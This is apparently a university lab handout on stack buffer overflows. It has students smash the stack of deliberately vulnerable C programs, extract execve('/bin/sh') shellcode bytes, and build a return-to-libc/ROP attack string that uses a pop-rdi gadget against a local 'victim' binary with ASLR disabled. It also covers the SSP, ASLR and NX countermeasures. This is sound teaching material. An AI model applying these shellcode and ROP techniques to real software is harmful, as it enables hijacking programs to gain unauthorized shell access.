# Stack Overflow #

This week we are going to learn how programs exploit bad programming. In particular, how well-crafted input can force a program to execute something completely different than what it was originally intended to do.

# Part 1: Buffer Overflow #

As you are probably well aware, C gives you total programming power. But with great power, comes great responsibility. One of the biggest problems with C is that many programmers do not check whether the data structures that they allocate in the stack are overflown.

Compile and test the following simple program. Call it `smashing.c`

``` c
#include <stdio.h>
#include <string.h>

void main()
{
  char buffer[10];
  puts("Type a very long string:");
  gets(buffer);
  if (strlen(buffer) < 50) {
    puts("I said long!!!!. Try again\n");
  } else {
    printf("Input: [%s]\n", buffer);
  }
}
```

Compile it (`gcc -o smashing smashing.c`)

**Question 1:** What is the warning you receive when you compile it? Based on the behavior of this program, explain why it is warning.

**Question 2:** What happens when you give it a long input?


## GCC Stack-Smashing Protector (SSP) ##

gcc can help us defend against these types of buffer overflows. Newer versions of gcc have this protection enabled by default. Not in our lab machines. Instead we need to enable it at compile time:

	gcc -fstack-protector -o smashing smashing.c

Run it again.

**Question 3:** What is the difference now?

# Part 2: Stack Subjugation #

You already knew that it is easy to clobber the stack (I am sure you have done it plenty of times). Can we do anything interesting by overwriting the stack? Let us try. Call this program `subjugating.c`. Compile it and run it normally (w/o the stack protector).

``` c
#include <stdio.h>
#include <stdlib.h>
int i;

void do_not_execute(void)
{
  printf("\nDo not execute!!!!!!!!!!!!!\n");
  exit(1);
}

void function(void) {
  long int stackTop[0];
  for (i=0;i<16;i++) {
    printf("stack offset %d from stackTop: %x value %x\n",i, stackTop + i, *(stackTop+i));
  }
  *(stackTop + 3) = (long int)do_not_execute;
  printf("return to %x\n\n", *(stackTop+8));
}

void main() {
  int x;

  x = 0;
  printf("address of do_not_execute %x\n", do_not_execute);
  printf("address of function %x\n", function);
  printf("address of main %x\n", main);
  function();
  x = 1;
  printf("value of %d\n",x);
  printf("hello world\n");
}
```

Don't you love that C allows you to define arrays of size zero? (Hint: Fix the code so that it the array isn't size zero)

**Question 4:** Why does it execute the function `do_not_execute`?

- Hint, you should know what a stack frame is (remember your assembly programming?). If not, head here: [http://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64/](http://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64/)

## Try Stack-Smashing Protector in this program ##

Enable SSP for this program. (`-fstack-protector` option)

**Question 5** Why doesn't SSP work in this program? (Hint: Consider what you did here as compared to Part 1)

## Address Space Layout Randomization (ASLR) ##

Run the program several times. As you can see, the addresses of the stack changes every time. This is a security counter-measure. This way it is more difficult to know the addresses that we need to override (when we try to attack a binary we can't compile). Let us disable it by running it as follows:

	setarch `arch` -R ./subjugating

As you can see, now the stack is always exactly in the same place. This is our second counter-measure to stack overflows.

# Part 3: Smashing to Subjugate #

We have learned that we can make a program crash or execute code that is not intended to do. But, can we mix both at the same time? Of course we can. But this time we need to be crafty. And fortuantely Ben Lynn (a PhD graduate from Standford whose area of research is crypto) has created a great tutorial that we can
reuse. Now head to [http://crypto.stanford.edu/~blynn/rop/](http://crypto.stanford.edu/~blynn/rop/) and do the first part of the exercise (all the way to *The Importance of Being Patched*). I'll simply add to his tutorial in areas that you will probably have trouble understanding.

But be careful about the following three things:

a) Change your prompt. This will make it easy to know if you are inside the shell executed by the program or not. In the terminal type the following after you start up your shell program:

	PS1='TEST> '

b) when you execute the binary of shell.c, type exit to exit it.

c) There is a typo in the command that generates the file `shellcode`.

	xxd -s0x4f4 -l32 -p a.out shellcode

It should be the following instead (notice the redirection). Make sure you use the right address

	xxd -s0x4f4 -l32 -p a.out > shellcode

## System Call ##

In Linux `system` is a system call of the kernel. It is very simple. It is called using `syscall` with a value of 0x3b in the `rax` register, a pointer to the command to execute in the `rdi` register; `rsi` points to the list of arguments, and `rdx` to the environment variables. In this case the latter two are NULL.

## The Assembly ##

This is a very well crafted piece of code. The challenge of the attack is to get the address of the string `/bin/sh` in the `rdi` register. But we have no clue where this code is going to end, so the easiest is to get the address of the string into the stack and then pop it into the register. How do we do it? if we call a function the stack automatically loads the address immediately after the function. Let me do a play-by-play:

1. We jump to `there`
2. We call `here` (go back to the top of the assembly); this pushes the address of `/bin/sh` into the stack.
3. Now we pop the address of `/bin/sh` into `rdi`, clear `rax` and `rsi`, and do the syscall.
4. We do the syscall, which executes the command `/bin/sh` (the shell)

``` c
int main() {
  asm("\
needle0: jmp there\n\
here:    pop %rdi\n\
         xor %rax, %rax\n\
         movb $0x3b, %al\n\
         xor %rsi, %rsi\n\
         xor %rdx, %rdx\n\
         syscall\n\
there:   call here\n\
.string \"/bin/sh\"\n\
needle1: .octa 0xdeadbeef\n\
  ");
}
```

## Extracting the Binary ##

The command extracts the given bytes from your binary. Make sure you use the correct offset (in my case it was 0x4f4). It outputs the values in hexadecimal so we can easily read it.

	xxd -s0x4f4 -l32 -p a.out > shellcode

Make sure your `shellcode` matches:

	cat shellcode
	eb0e5f4831c0b03b4831f64831d20f05e8edffffff2f62696e2f736800ef
	bead

This shellcode is important because we are going to insert that later into the tutorial to make the victim program grant access to the shell.

## Executable Space Protection (NX) ##

As you learned in the tutorial above, code in the stack cannot be executed. This is a great countermeasure against stack overflows. Go back to the tutorial and do the section *Executable space perversion*

**Question 6** What is the behavior of the program when you enable NX?

**Question 7** List the 3 counter-measures against stack overflows that we learned in this lab

----------

# Part 4: Running without ASLR (Optional) #

*If you have extra time or want to continue playing around, go ahead and do the following section.*

Do the section *The Importance of Being Patched*. It will show you that it is possible to know the address of the stack we need to attack by using `ps`

The rest of the tutorial is fascinating, to say the least. But we need to fix the tutorial so it works on our version of Linux:

1. First, in order to get his attack to work in our lab computers you need to change the sourcecode of `victim.c`. *You need to change the size of the buffer from 64 to 128 bytes.*
2. The location of the library is `/lib64/libc.so.6`
3. The addresses of `<system>` and `<exit>` that are extracted  using `nm` are absolute (it means we don't need to add the base)

``` bash
nm -D /lib64/libc.so.6 | grep '\<exit\>'   | cut -f1 -d' '
nm -D /lib64/libc.so.6 | grep '\<system\>' | cut -f1 -d' '
```

4. You need to change the attack string: change `%0130d` to `%0256d` to compensate for the bytes we have added. My values are:

| Values           | Bytes              |
|------------------|--------------------|
| base             | 0x000000392ba00000 |
| gadget           |            0x20338 |
| system           | 0x000000392ba3e900 |
| exit             | 0x000000392ba35a50 |
| address of array |     0x7fffffffddd0 |

5. There is an error in his execution of the attack. He does not include any input to the shell command. Try the command below instead (remember to calculate your own values for base, gadget, system, and address of array).

``` bash
( (
echo -n /bin/sh | xxd -p
printf %0258d 0;
printf %016x $((0x000000392ba00000+0x20338)) | tac -rs..
printf %016x 0x7fffffffddd0 | tac -rs..
printf %016x 0x000000392ba3e900 | tac -rs..
echo
) |  xxd -r -p; echo ; echo ls -lia ) | setarch `arch` -R ./victim
```

In a nutshell, this is the attack:

The goal is to replace the stack with the following data:

| Location                   | Note                                                                    |
|----------------------------|-------------------------------------------------------------------------|
| address of function system |                                                                         |
| address of /bin/sh         |                                                                         |
| address of gadget          | <- this was the return address of the original call                     |
| 8 zeros                    | replaces the saved rbp (we never return to main, so it does not matter) |
| 121 zeros                  | buffer variable (128 bytes)                                             |
| /bin/sh (7 bytes)          |                                                                         |

Let me explain the *gadget*. This is the code that is needed to put the address of `/bin/sh` into `rdi` (execute `pop rdi` then `retq`). These two instructions are simply two bytes: 0x5f followed by 0xc3. Ben (the author of the page) shows us that all we need is to find those two bytes *somewhere* (anywhere) in the executable section of the library of libc.  gcc will not complain if we jump to a section of the valid code. This way we avoid *Executable space protection*.

So here is the play by play:

1. Insert the payload into the stack, replace the stack as shown above.
2. Execute the gadget. The gadget pops the top of the stack (containing the address of /bin/sh into the register `rdi`
3. Executes the return `retq`. The return  address is the address of the `system` function. Control is transferred to it.
4. `system` behaves as expected. Executes `/bin/sh` (the shell)
5. At the end of `system` control is transferred to its return address (at the top of the stack),
6. The return value is invalid, so the program crashes with a segmentation fault. It is easy to fix it. Just add to the attack the address of `exit` and append that to the string that goes into the stack. I'll leave that as an exercise to the reader.

> If I were stuck on a desert island with only one compiler, I'd want a C compiler ---Brian Kernighan

Me too! Happy Coding.

# Submission #

You will be submitting one file:

- `report.txt` Your answers to the 7 questions
